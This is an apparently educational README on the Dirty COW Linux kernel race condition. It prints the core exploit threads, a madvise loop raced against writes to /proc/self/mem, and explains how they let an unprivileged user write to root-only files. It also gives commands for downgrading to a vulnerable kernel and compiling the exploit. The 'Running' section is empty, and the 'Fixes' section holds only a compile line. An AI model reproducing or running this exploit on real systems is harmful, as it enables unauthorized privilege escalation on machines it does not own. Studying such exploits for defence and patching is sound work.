
# Dirty Cow exploit

## Exploit Overview
"A race condition was found in the way Linux kernel's memory subsystem
handled breakage of the read only private mappings COW situation on
write access.

An unprivileged local user could use this flaw to gain
write access to otherwise read only memory mappings and thus increase
their privileges on the system." - [From Redhat CVE](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#)

The exploit leverages two functions madvise(MADV_DONTNEED) and open("/proc/self/mem",O_RDWR), to create a race condition between the two. Simply stated, we map the file to be changed to a copy that we can write to. We aren't able to write this copied file to the original file because we don't have the necessary permissions, however we are able to circumvent this via the race condition.

The first function, madvise, looks like this:

```
void *madviseThread(void *arg){
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<100000000;i++)
    {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("madvise %d\n\n",c);
  }
```
The madvice call is used mainly for optimization by allowing the user to give advice/directions to the kernel about how the given address range will be used. In this case we tell it that we don't need the first 100 bytes by passing 100, MADV_DONTNEED. The man page specifies that this means "do not expect access in the near future" and that the memory access will differ now in that any "subsequent accesses of pages in the range will succeed, but will result in either repopulating the memory contents from the up-to-date contents of the underlying mapped file". This is very important to the exploit as it tells us that everytime we try to access this file we will repopulate the contents, which is part of the race condition.

The second function, proc/self/mem uses 'proc' which acts a pseudo-file system that helps runs most file operations in linux (everything is a file is very powerful here). /proc/self/mem is a "file" that contains the current process' memory, which we use to write to our file.

```
void *procselfmemThread(void *arg){
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<100000000;i++) {
        lseek(f,(uintptr_t) map,SEEK_SET);
        c+=write(f,str,strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}
```
The above code attempts to write the passed argument string in the memory of the process in the location of the mapped file. This tries to write to the copy of the file, creating a copy-on-write event. 

This should not work and the two methods working independent of each other would not cause such an exploit to occur, but when raced against each other, an edge case occurs in which the actual file is written to instead of the mapped file. This allows us, for this simple case, to write to a file with root only write permission

## Compilation

This is a relatively recent zero day and as such works on any of the kernels before the ones listed below, as they are the ones where the patch was added:

[Patched Kernels](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions)

If your kernel is newer, use the following commands based on your operating system, where $image-number-here$ is a kernel number before the ones in the link above. We highly recomend you search for the complete image name in your prefered OS and replace it below, as only the image number will not be the entire name of the package.

####Ubuntu
```
sudo apt-get install linux-image-$image-number-here$
sudo apt-get install linux-headers-$image-number-here$
```
####Debian
```
aptitude install linux-image-$image-number-here$
aptitude install linux-headers-$image-number-here$
```
####Arch
```
pacman -U linux-$image-number-here$.pkg.tar.xz linux-headers-$image-number-here$.pkg.tar.xz
```
After you downgrade your kernel, the compilation is as such

```
gcc -pthread dirtyc0w.c -o dirtyc0w
```
The -pthread option is included because of the multithread aspect of the exploit, the man page for gcc tells us that it "Adds support for multithreading with the pthreads library. This option sets flags for both the preprocessor and linker".

## Running


## Fixes
```
gcc -pthread -o dirty_cow dirty_cow.c
```

